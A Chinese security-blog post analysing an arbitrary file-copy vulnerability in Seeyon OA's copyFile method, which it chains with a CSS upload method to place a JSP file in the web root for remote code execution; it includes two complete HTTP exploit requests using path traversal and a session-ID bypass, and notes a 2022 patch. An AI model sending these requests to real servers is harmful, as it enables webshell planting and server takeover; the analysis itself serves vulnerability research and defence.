致远OA代码审计系列6-CopyFile文件复制漏洞分析
============================

原创 作者:archive 公号:安全回忆录 发布时间:2023-12-05 0:00 发表于北京

原文地址：[致远OA代码审计系列6-CopyFile文件复制漏洞分析](https://mp.weixin.qq.com/s/-R5TQ5dsg7aYycCoU6ZpJA)

**漏洞描述:**

在CipSynSchemeManager的copyFile方法实现了文件复制的功能, 但是方法没有对source参数和target参数进行检测,, 攻击者可以通过该方法实现任意文件的复制, 配合《致远OA代码审计系列二》文章提到的权限绕过, 可以实现前台RCE。  

[致远OA代码审计系列二](http://mp.weixin.qq.com/s?__biz=MzkyNjM1MDMyMg==&mid=2247483803&idx=1&sn=a66efb07c048a8219ab30811b4275643&chksm=c239ef06f54e6610f36698e54678e2cc4cf5c77e5248dc8933d76d0d779dff47d8e2c233bc53&scene=21#wechat_redirect)  

[致远OA代码审计系列一](http://mp.weixin.qq.com/s?__biz=MzkyNjM1MDMyMg==&mid=2247483794&idx=1&sn=84af07a085a3b67efb46e9b09ea17018&chksm=c239ef0ff54e6619906b8ad3db6c26e1c2517356c80920493898cd472682b8da463bb4922757&scene=21#wechat_redirect)

**适用版本:**

适配版本范围：V5&G6\_V6.1至V8.0SP2全系列版本、V5&G6&N\_V8.1至V8.1SP2全系列版本。

**漏洞分析:**

AjaxController中的ajaxAction方法允许调用beanCacheMap中的类, CipSynSchemeManager也在其中,可以通过ajax.do路由进行方法调用,  copyFile方法中直接将传入的source文件copy到target目标文件中, 且没有对source和target格式,后缀进行任何检测. 攻击者可先上传正常后缀文件, 通过copyFIle二次复制文件为JSP文件, 实现任意文件上传。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtCiaoqyyDiaXPdicIbqYbEODudy2zKfhP95YGdpRCLCzB6tOnsYTACkmmicHMqcreMVIkbJOjCC4mz2Q/640?wx_fmt=png&from=appmsg)

需要注意一点, 这里如果文件已经存在则不会进行复制,所以每次复制target文件名需要不一致。还需要找一个上传的点, 这里采用的是portalCssManager的generateCssFileByCssStr方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtCiaoqyyDiaXPdicIbqYbEODugXibPVXPMZeQ77N1sbNt6VDdk9RnfTTA0VpfSpbAaxeLVrLt7bYKqhA/640?wx_fmt=png&from=appmsg)

该方法上传路径为:A8\\base\\resources\\portal\\css\\, 整体利用思路先随便上传一个正常后缀文件, 且知道文件上传的路径和文件名, 再将其复制到WEB路径下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtCiaoqyyDiaXPdicIbqYbEODu6xMjXLgdEf4NQHSWsnHr3uGRuDVO3L52RSIHa6AUwun2UPbjowyiczg/640?wx_fmt=png&from=appmsg)

上传文件:  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtCiaoqyyDiaXPdicIbqYbEODuhPXLc0DtzuH8HkdmwmCTIQjRUPdMO2OkFwbgAB0dG1sx9icpXicbuTUw/640?wx_fmt=png&from=appmsg)

```http
POST /seeyon/ajax.do?method=ajaxAction&managerName=portalCssManager&rnd=57507 HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 65
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=8D5D325CDA1D0D603098AB990CA04CCE; login_locale=zh_CN
Accept-Encoding: gzip, deflate


arguments=%5B%22aaaaa%22%5D&managerMethod=generateCssFileByCssStr
```

再通过copyFIle复制到ROOT下:  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtCiaoqyyDiaXPdicIbqYbEODuZUW4jQiaFBricnCB9WjJHBsItqqoGIhkoxpibNqBT6a7eaUAxGWUxpXPA/640?wx_fmt=png&from=appmsg)

```http
POST /seeyon/ajax.do;Jsessionid=a?method=ajaxAction&managerName=cipSynSchemeManager&rnd=29981 HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 141
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=8D5D325CDA1D0D603098AB990CA04CCE; login_locale=zh_CN
Accept-Encoding: gzip, deflate


arguments=["../../../../resources/portal/css/4468644017858628175","../../ApacheJetspeed/webapps/ROOT/sectestdssd.jsp"]&managerMethod=copyFile
```

访问文件:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMtCiaoqyyDiaXPdicIbqYbEODuKzQicpXTO3b66m4lUjGcAIFhticClyFcs03iaQmPia5QeDtmVMJdjsRY6g/640?wx_fmt=png&from=appmsg)

**总结:**

致远OA上传文件的点很多, 当致远OA权限绕过不可用, 但有系统相关账号的情况可以考虑该漏洞。致远官方于2022年8月发布该漏洞补丁。